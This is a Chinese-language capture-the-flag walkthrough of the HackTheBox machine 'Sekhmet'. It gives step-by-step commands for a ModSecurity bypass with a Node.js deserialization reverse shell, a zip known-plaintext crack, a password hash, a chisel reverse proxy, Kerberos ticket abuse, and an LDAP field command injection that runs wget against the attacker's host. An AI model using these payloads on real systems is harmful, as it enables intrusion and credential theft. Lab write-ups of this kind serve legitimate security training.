---
title: Sekhmet - HackTheBox
url: https://darkwing.moe/2022/12/28/Sekhmet-HackTheBox/
source: 喵喵喵喵
date: 2022-12-29
fetch_date: 2025-10-04T02:38:45.046275
---

# Sekhmet - HackTheBox

[![](/img/avatar.jpg)](/)

##### 暗羽

Discord@darkwing\_nya

* [主页](/)
* [Archives](/archives)
* [Tags](/tags)
* [Categories](/categories)
* [Github](https://github.com/zjicmDarkWing)
* [Twitter](https://twitter.com/darkwing_nya)
* [Buy me a coffee](https://www.buymeacoffee.com/darkwing_nya)
* [About](https://darkwing.moe/2015/01/01/about/)

Sekhmet - HackTheBox

# Sekhmet - HackTheBox

##### 2022-12-28

#### TOC

1. [1. 基本信息](#基本信息)
   1. [1.1. 10.10.11.179](#10-10-11-179)
2. [2. 端口扫描](#端口扫描)
   1. [2.1. 80](#80)
3. [3. 子域名扫描](#子域名扫描)
   1. [3.1. portal](#portal)
4. [4. portal](#portal-1)
   1. [4.1. ModSecurity](#ModSecurity)
   2. [4.2. shell](#shell)
5. [5. backup.zip](#backup-zip)
6. [6. ray.duncan & user flag](#ray-duncan-amp-user-flag)
7. [7. 容器网络扫描](#容器网络扫描)
8. [8. SMB](#SMB)
9. [9. LDAP](#LDAP)
   1. [9.1. 命令注入](#命令注入)
   2. [9.2. applocker](#applocker)
10. [10. scriptrunner](#scriptrunner)
    1. [10.1. 信息](#信息)
11. [11. bob.wood](#bob-wood)
12. [12. bob.woodADM](#bob-woodADM)
13. [13. 参考资料](#参考资料)

# Sekhmet - HackTheBox

2022-12-28

# 基本信息

* <https://www.hackthebox.com/home/machines/profile/495>
* ## 10.10.11.179

![](https://github.com/zjicmDarkWing/images2022/raw/main/2022122706.jpg)

# 端口扫描

22和80:

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 ``` | ``` $ nmap -sC -sV -Pn 10.10.11.179 Starting Nmap 7.93 ( https://nmap.org ) at 2022-12-28 13:12 CST Nmap scan report for 10.10.11.179 Host is up (0.19s latency). Not shown: 998 filtered tcp ports (no-response) PORT   STATE SERVICE VERSION 22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0) | ssh-hostkey: |   3072 8c7155df97275ed5375a8de2923bf36e (RSA) |   256 b232f5889bfb58fa35b0710c9abd3cef (ECDSA) |_  256 eb73c0936e40c8f6b0a828937d18474c (ED25519) 80/tcp open  http    nginx 1.18.0 |_http-title: 403 Forbidden |_http-server-header: nginx/1.18.0 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel  Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 116.09 seconds ``` |

## 80

需要加hosts：

|  |  |
| --- | --- |
| ``` 1 ``` | ``` 10.10.11.179 www.windcorp.htb ``` |

![](https://github.com/zjicmDarkWing/images2022/raw/main/2022122801.jpg)

# 子域名扫描

继续扫描子域名发现portal：

|  |  |
| --- | --- |
| ``` 1 2 3 ``` | ``` ffuf -w ~/Tools/dict/SecLists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u "http://www.windcorp.htb/" -H 'Host: FUZZ.windcorp.htb' -fs 153  portal                  [Status: 403, Size: 2436, Words: 234, Lines: 44, Duration: 203ms] ``` |

## portal

同样加hosts后访问：

![](https://github.com/zjicmDarkWing/images2022/raw/main/2022122802.jpg)

# portal

常规弱口令 admin:admin 登录，根据cookie和响应头可以知道是nodejs：

![](https://github.com/zjicmDarkWing/images2022/raw/main/2022122803.jpg)

## ModSecurity

简单测试可以发现存在ModSecurity：

![](https://github.com/zjicmDarkWing/images2022/raw/main/2022122804.jpg)

## shell

利用modsecurity ruleset bypass和nodejs rce实现rce：

* ModSecurity Vulnerability & PoC (CVE-2019-19886)
  <https://www.secjuice.com/modsecurity-vulnerability-cve-2019-19886/>
* Exploiting Node.js deserialization bug for Remote Code Execution | OpSecX
  <https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/>
* Node.Js-Security-Course/nodejsshell.py at master · ajinabraham/Node.Js-Security-Course
  <https://github.com/ajinabraham/Node.Js-Security-Course/blob/master/nodejsshell.py>

|  |  |
| --- | --- |
| ``` 1 2 3 ``` | ``` python2 nodejsshell.py 10.10.14.6 4444  curl -i --cookie "app=$cookie_app;profile=$(echo '{"username":"_$$ND_FUNC$$_function(){eval(String.fromCharCode(10,......59,10))}()"}'|base64 -w0)=<original_cookie>" 'http://portal.windcorp.htb/' ``` |

得到webster用户shell：

![](https://github.com/zjicmDarkWing/images2022/raw/main/2022122805.jpg)

# backup.zip

zip文件无法直接破解，但能够查看里面目录结构，知道其中包括/etc/passwd文件，我们可以尝试已知明文攻击：

* Brute Force - CheatSheet - HackTricks
  <https://book.hacktricks.xyz/generic-methodologies-and-resources/brute-force#known-plaintext-zip-attack>

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 6 7 8 9 ``` | ``` # create a zip of the passwd file cp /etc/passwd . && zip passwd.zip passwd  # crack and this produces a sequence of codes ./bkcrack -C backup.zip -c etc/passwd -P passwd.zip -p passwd d6829d8d 8514ff97 afc3f825  # set a new pass to the encrypted file ./bkcrack -C backup.zip -U unlocked.zip miao -k d6829d8d 8514ff97 afc3f825 ``` |

var/lib/sss/db/cache\_windcorp.htb.ldb中发现一组账号hash,破解出来密码是pantera：

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 ``` | ``` Ray.Duncan@WINDCORP.HTB  $6$nHb338EAa7BAeuR0$MFQjz2.B688LXEDsx035.Nj.CIDbe/u98V3mLrMhDHiAsh89BX9ByXoGzcXnPXQQF/hAj5ajIsm0zB.wg2zX81  pantera ``` |

# ray.duncan & user flag

使用域账号ssh登录，ray.duncan可以得到webserver的root权限：

|  |  |
| --- | --- |
| ``` 1 2 3 ``` | ``` ssh 'ray.duncan@windcorp.htb'@10.10.11.179  pantera ``` |

![](https://github.com/zjicmDarkWing/images2022/raw/main/2022122806.jpg)

webserver的root得到user flag：

![](https://github.com/zjicmDarkWing/images2022/raw/main/2022122807.jpg)

# 容器网络扫描

进一步探测容器子网,发现192.168.0.2应该是DC：

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 ``` | ``` for p in {1..65535}; do nc -vn 192.168.0.2 $p -w 1 -z & done 2> output.txt  (UNKNOWN) [192.168.0.2] 22 (ssh) open (UNKNOWN) [192.168.0.2] 53 (domain) open (UNKNOWN) [192.168.0.2] 80 (http) open (UNKNOWN) [192.168.0.2] 88 (kerberos) open (UNKNOWN) [192.168.0.2] 389 (ldap) open (UNKNOWN) [192.168.0.2] 445 (microsoft-ds) open (UNKNOWN) [192.168.0.2] 464 (kpasswd) open (UNKNOWN) [192.168.0.2] 3268 (?) open (UNKNOWN) [192.168.0.2] 3269 (?) open (UNKNOWN) [192.168.0.2] 5985 (?) open (UNKNOWN) [192.168.0.2] 9389 (?) open (UNKNOWN) [192.168.0.2] 49664 (?) open (UNKNOWN) [192.168.0.2] 51648 (?) open (UNKNOWN) [192.168.0.2] 58219 (?) open (UNKNOWN) [192.168.0.2] 64610 (?) open ``` |

所以需要设置代理和DC通信：

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 ``` | ``` # local ./chisel_1.7.0-rc7_darwin_amd64 server -p 9999 --reverse  # target ./chisel_1.7.6_linux_amd64 client --max-retry-count=1 -v 10.10.14.6:9999 R:1080:socks ``` |

然后设置好proxychains,即可和DC通信：

|  |  |
| --- | --- |
| ``` 1 ``` | ``` proxychains4 python3 ~/Tools/impacket/examples/getST.py -dc-ip 192.168.0.2 -spn cifs/hope.windcorp.htb 'windcorp.htb/ray.duncan:pantera' ``` |

# SMB

上面已经获得了ST，使用ST访问smb：

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 ``` | ``` export KRB5CCNAME=ray.duncan.ccache proxychains4 python3 ~/Tools/impacket/examples/smbclient.py ray.duncan@hope.windcorp.htb -k -no-pass  # shares ADMIN$ C$ IPC$ NETLOGON SYSVOL WC-Share # use WC-Share # cd temp # cat debug-users.txt IvanJennings43235345 MiriamMills93827637 BenjaminHernandez23232323 RayDuncan9342211 ``` |

# LDAP

参考这个：

* MS ADV190023
  <https://gist.github.com/tscherf/a0be193fe7bd603bbe1f511f9a00e737>

在受感染的容器上，转储 ldap 数据库以获取更多信息：

|  |  |
| --- | --- |
| ``` 1 ``` | ``` ldapsearch -LLLY GSSAPI -H ldap://windcorp.htb -b 'DC=windcorp,DC=htb' > ldapinfo.txt ``` |

## 命令注入

我们可以更改 `ray.duncan` 的手机号，这个字段容易被cmd注入。以以下形式构造有效负载：`mobile: ;<cmd>`

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 6 7 8 ``` | ``` # create a mod.ldif dn: CN=Ray Duncan,OU=Development,DC=windcorp,DC=htb changetype: modify replace: mobile mobile: ;wget http://10.10.14.6:7777/file -O c:\wc-share\file;  # then send to modify the ldap record ldapmodify -Y GSSAPI -H ldap://windcorp.htb -D "CN=Ray Duncan,OU=Development,DC=windcorp,DC=htb" -f mod.ldif ``` |

检查更改并等待一段时间（2 分钟）以观察希望的请求。**注意**：mobile字段有字符限制（即 64）

![](https://github.com/zjicmDarkWing/images2022/raw/main/2022122808.jpg)

## applocker

目标正在运行**applocker**，我们可以制作一个 ldif 来获取 applocker 策略

|  |  |
| --- | --- |
| ``` 1 2 3 4 ``` | ``` dn: CN=Ray Duncan,OU=Development,DC=windcorp,DC=htb changetype: modify replace: mobile mobile: ;Get-AppLockerPolicy -Effective -Xml > c:\wc-share\u ``` |

通过阅读政策，我们了解到我们需要寻找一个不在例外列表中的可以写入的文件夹

参考这个：

* World-writable directories in %windir%
  <https://gist.github.com/mattifestation/5f9...